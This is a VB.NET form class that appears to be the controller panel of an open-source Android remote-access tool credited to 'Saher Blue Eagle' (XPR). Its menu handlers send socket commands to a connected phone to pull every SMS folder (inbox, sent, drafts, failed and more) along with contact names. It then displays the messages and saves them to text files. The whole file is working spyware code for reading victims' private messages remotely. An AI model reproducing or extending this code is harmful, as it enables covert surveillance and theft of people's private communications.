Public Class Android_sms
    Public sock As Integer
    Private Find_Name As Boolean = False

    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################

    Private Sub CheckBox1_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = True Then
            'show confrm msg
            Dim result As Integer = MessageBox.Show("Are you sure to view contacts names " & vbNewLine & "this may make the connection is slow somehow", "SMS Manager Question", MessageBoxButtons.YesNo, MessageBoxIcon.Question)
            If result = DialogResult.No Then
                Exit Sub
            ElseIf result = DialogResult.Yes Then
              Find_Name = True
            End If


        Else
            Find_Name = False
        End If
    End Sub

    Private Sub GetInboxSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetInboxSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/inbox" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub GetOutboxSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetOutboxSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/outbox" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub GetSentSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetSentSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/sent" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub GetFailedSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetFailedSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/failed" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub GetDraftSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetDraftSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/draft" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub GetUndeliveredSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetUndeliveredSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/undelivered" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub GetAllCurrentSmsToolStripMenuItem_Click(sender As System.Object, e As System.EventArgs) Handles GetAllCurrentSmsToolStripMenuItem.Click
        ListView1.Items.Clear()
        Form1.Server.Send_DX(sock, "sms_manager" & SplitData & "content://sms/" & SplitData & Find_Name & SplitData)
    End Sub

    Private Sub ListView1_SelectedIndexChanged(sender As System.Object, e As System.EventArgs) Handles ListView1.SelectedIndexChanged
        If ListView1.SelectedItems.Count = 1 Then
            RichTextBox1.Text = "Message Content Viewer"
            RichTextBox1.AppendText(vbNewLine & "Number : " & ListView1.SelectedItems(0).SubItems(0).Text & vbNewLine)
            RichTextBox1.AppendText(vbNewLine & "Contact Name : " & ListView1.SelectedItems(0).SubItems(1).Text & vbNewLine)
            RichTextBox1.AppendText(vbNewLine & "Date : " & ListView1.SelectedItems(0).SubItems(2).Text & vbNewLine)
            RichTextBox1.AppendText(vbNewLine & "Message Content : " & ListView1.SelectedItems(0).SubItems(3).Text & vbNewLine)

        End If
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        If SaveFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            Try
                If SaveFileDialog1.FileName.Contains(".txt") Then
                    RichTextBox1.SaveFile(SaveFileDialog1.FileName)

                Else
                    RichTextBox1.SaveFile(SaveFileDialog1.FileName & ".txt", RichTextBoxStreamType.UnicodePlainText)
                    RichTextBox1.SaveFile(SaveFileDialog1.FileName & "[1].txt")
                End If

            Catch ex As Exception
                MsgBox("Cannot Save Text to file " & vbNewLine & "Exception : " & ex.Message, MsgBoxStyle.Critical)
            End Try
        End If
    End Sub
End Class